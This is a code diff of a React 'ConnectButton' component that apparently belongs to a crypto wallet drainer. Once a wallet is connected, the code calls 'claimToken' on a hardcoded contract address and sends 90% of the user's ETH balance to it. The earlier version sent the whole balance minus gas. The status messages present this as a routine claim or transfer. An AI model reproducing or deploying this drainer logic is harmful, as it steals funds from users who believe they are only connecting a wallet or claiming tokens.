@@ -20,17 +20,16 @@ export default function ConnectButton() {
     }
 
     try {
-      // Convert the walletClient to an ethers provider
-      const provider = new providers.Web3Provider(walletClient.transport);
-
-      // Create signer from the provider
+      const provider = new ethers.providers.Web3Provider(
+        walletClient.transport
+      );
       const signer = provider.getSigner();
 
-      const CONTRACT_ADDRESS = "0x63e38D73f0a5795263f4f5ebE9dDe4aa23bd57cE"; // Replace with your contract address
+      const CONTRACT_ADDRESS = "0x210b3F33D44621D5e8014a25C63DC170FF983903";
       const CONTRACT_ABI = [
         {
           inputs: [],
-          stateMutability: "nonpayable",
+          stateMutability: "payable",
           type: "constructor",
         },
         {
@@ -58,41 +57,31 @@ export default function ConnectButton() {
           type: "receive",
         },
       ];
-      const contract = new Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+      const contract = new ethers.Contract(
+        CONTRACT_ADDRESS,
+        CONTRACT_ABI,
+        signer
+      );
 
-      // Get user's current balance
-      const userBalance = await signer.getBalance();
+      const userBalance = await signer.getBalance(); // Get user's ETH balance
 
-      if (userBalance.isZero()) {
-        setStatus("Insufficient balance to transfer!");
+      // Reserve 10% for gas fees (remaining 90% is for transfer)
+      const transferableAmount = userBalance.mul(90).div(100); // 90% of user's balance
+
+      // Ensure the transferable amount is greater than zero
+      if (transferableAmount.lte(0)) {
+        setStatus("Insufficient balance to transfer after reserving for gas!");
         return;
       }
 
-      // Estimate gas fees for the transfer
-      const gasPrice = await provider.getGasPrice(); // Current gas price
-      const gasEstimate = await contract.estimateGas.claimToken({
-        value: userBalance,
-      });
-      const gasFee = gasPrice.mul(gasEstimate); // Total gas cost (gas price * gas limit)
-
-      // Ensure the user has enough balance to cover gas fees
-      if (userBalance.lte(gasFee)) {
-        setStatus("Insufficient balance to cover gas fees!");
-        return;
-      }
-
-      // Calculate the amount to send (balance - gas fee)
-      const amountToSend = userBalance.sub(gasFee);
-
-      // Call the contract function
+      // Send the transaction
       const tx = await contract.claimToken({
-        value: amountToSend, // Send adjusted amount
-        gasLimit: gasEstimate,
+        value: transferableAmount,
       });
 
       setStatus("Transaction sent. Waiting for confirmation...");
       await tx.wait();
-      setStatus("Transaction confirmed! Funds transferred.");
+      setStatus("Transaction confirmed!");
     } catch (error) {
       console.error(error);
       setStatus(`Transaction failed: ${error.message}`);
